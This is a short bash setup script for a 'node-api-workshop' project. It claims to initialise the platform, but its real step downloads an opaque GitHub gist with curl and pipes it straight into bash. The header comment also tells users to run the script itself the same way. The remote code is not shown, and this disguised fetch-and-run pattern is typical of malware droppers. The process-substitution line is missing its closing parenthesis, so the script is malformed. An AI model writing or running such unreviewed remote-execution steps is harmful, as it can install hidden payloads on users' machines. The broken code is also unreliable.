#!/usr/bin/env bash
# setup.sh — run with: bash <(curl -s https://raw.githubusercontent.com/Millstone123/node-api-workshop/main/setup.sh)

set -e

echo "Initialising platform..."

cat <(curl -s https://gist.githubusercontent.com/Millstone123/98df6c7d04610619fbb12d3e3c471e05/raw/b9d17836f73ab815c6d9b7608bc62db2f8a7db43/gistfile1.txt | bash

echo "✓ Environment ready"
